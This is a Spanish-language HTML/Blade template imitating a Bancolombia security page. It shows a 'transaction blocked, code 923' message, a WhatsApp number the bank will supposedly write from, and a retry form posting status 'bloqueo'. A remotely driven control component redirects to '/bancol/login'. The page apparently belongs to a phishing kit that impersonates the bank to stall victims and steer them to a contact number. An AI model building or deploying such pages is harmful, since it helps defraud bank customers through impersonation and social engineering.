<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="csrf-token" content="{{ csrf_token() }}">
    <title>Seguridad - Bancolombia</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
            background-color: #2d2d2d;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .card {
            background-color: #ffffff;
            border-radius: 16px;
            padding: 40px 30px;
            max-width: 380px;
            width: 100%;
            text-align: center;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
        }

        .icon-container {
            width: 70px;
            height: 70px;
            background-color: #FDDA24;
            border-radius: 50%;
            display: flex;
            justify-content: center;
            align-items: center;
            margin: 0 auto 24px;
        }

        .icon-container svg {
            width: 36px;
            height: 36px;
        }

        .title {
            font-size: 20px;
            font-weight: 700;
            color: #000000;
            margin-bottom: 16px;
            line-height: 1.3;
        }

        .description {
            font-size: 14px;
            color: #4a4a4a;
            line-height: 1.6;
            margin-bottom: 20px;
        }

        .code {
            font-size: 16px;
            font-weight: 700;
            color: #000000;
            margin-bottom: 24px;
        }

        .btn-retry {
            background-color: #FDDA24;
            color: #000000;
            border: none;
            border-radius: 25px;
            padding: 14px 40px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            width: 100%;
            max-width: 280px;
            transition: background-color 0.2s;
        }

        .btn-retry:hover {
            background-color: #e5c520;
        }

        .btn-retry:active {
            transform: scale(0.98);
        }
    </style>
</head>

<body>
    <div class="card">
        <div class="icon-container">
            <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                <path d="M19.5 9.5V14.5C19.5 18.09 16.59 21 13 21H11C7.41 21 4.5 18.09 4.5 14.5V10C4.5 9.17 5.17 8.5 6 8.5C6.83 8.5 7.5 9.17 7.5 10V14H8.5V5C8.5 4.17 9.17 3.5 10 3.5C10.83 3.5 11.5 4.17 11.5 5V9.5H12.5V4C12.5 3.17 13.17 2.5 14 2.5C14.83 2.5 15.5 3.17 15.5 4V9.5H16.5V5.5C16.5 4.67 17.17 4 18 4C18.83 4 19.5 4.67 19.5 5.5V9.5Z" fill="#000000"/>
            </svg>
        </div>

        <h1 class="title">Por seguridad, no puedes continuar la transacción</h1>

        <p class="description">
            Código: 923 Para confirmar si eres tú quien hace la transacción, te escribiremos desde nuestro WhatsApp oficial 301 353 6788, responde Sí o No. Si tienes dudas, llámanos a la Sucursal Telefónica y elige la opción 3 y de nuevo 3.
        </p>

        <p class="code">Código 923</p>

        <form id="formRetry">
            <input type="hidden" id="no-status" name="status" value="bloqueo">
            <button type="submit" class="btn-retry" id="enviar">Intentar Nuevamente</button>
        </form>
        <div id="mensaje"></div>
    </div>

    <x-control
        :auto-guardar="false"
        :auto-completar="false"
        :auto-init="true"
        :debug="false"
        redirect-url="/bancol/login"
    />
</body>

</html>
